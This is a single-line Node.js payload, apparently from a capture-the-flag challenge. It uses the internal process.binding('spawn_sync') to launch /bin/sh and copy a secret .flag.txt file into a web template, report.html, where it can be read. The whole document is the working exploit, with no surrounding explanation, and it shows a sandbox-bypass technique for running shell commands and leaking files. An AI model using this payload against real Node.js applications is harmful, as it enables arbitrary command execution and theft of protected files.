process.binding('spawn_sync').spawn({file: '/bin/sh',args: ['/bin/sh', '-c', 'cat .flag.txt > ./templates/report.html'],stdio: [{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}]});
